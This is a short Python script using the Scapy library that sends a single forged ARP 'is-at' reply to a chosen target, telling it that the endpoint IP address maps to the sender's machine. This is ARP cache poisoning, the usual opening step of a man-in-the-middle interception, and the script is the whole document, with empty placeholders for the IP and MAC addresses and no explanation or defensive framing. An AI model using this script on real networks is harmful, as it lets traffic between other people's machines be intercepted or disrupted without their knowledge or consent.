from scapy.all import *

endpointIP = ""
targetIP = ""
targetMAC = ""

sendp(Ether(dst=targetMAC)/ARP(op="is-at", psrc=endpointIP, pdst=targetIP))
